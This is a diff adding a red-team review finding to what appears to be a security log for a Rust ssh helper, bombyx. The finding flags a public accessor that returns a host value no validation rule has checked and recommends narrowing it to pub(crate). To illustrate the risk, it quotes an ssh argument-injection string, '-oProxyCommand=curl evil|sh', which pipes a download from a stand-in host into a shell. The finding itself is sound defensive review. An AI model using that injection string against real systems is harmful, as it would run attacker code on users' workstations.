@@ -5,6 +5,36 @@ Security (Red Team) review findings. Newest first.
 
 ---
 
+### rt-2026-09-04-registry-host-is-pub-and-unchecked
+
+**Category:** Public surface nothing public consumes
+
+`Registry::host` is `pub` and returns a VM host that no rule has
+run on. bombyx's guarantee that a leading `-` never reaches
+`ssh` -- where `-oProxyCommand=curl evil|sh` runs code on the
+workstation -- rests on `Config::load` calling `host_problem` on
+whichever source won. A public accessor hands the unchecked
+value out past that point, so the guarantee belongs to the
+caller rather than to bombyx.
+
+The `Registry` in question was introduced in step 3 (#24) and
+nothing outside this crate calls it. Its sibling
+`Registry::project_host`, added in step 4 (#25), had the same
+shape and was narrowed to `pub(crate)` in the review round that
+raised this. `Registry::host` was left alone because it is not
+what step 4 changed, and narrowing an accessor the same round
+that adds one is the consolidation `/review` says never to apply
+in the round that found it.
+
+The fix is one word, `pub` to `pub(crate)`. It is a breaking
+library change on paper and not one in practice, because the
+type has never been released: both accessors are in the same
+unreleased cycle.
+
+Raised by red-team during the `/review2` on #25.
+
+---
+
 ### rt-2026-09-04-doc-cannot-link-a-plans-own-section
 
 **Category:** The fix stops one step short of what it was for
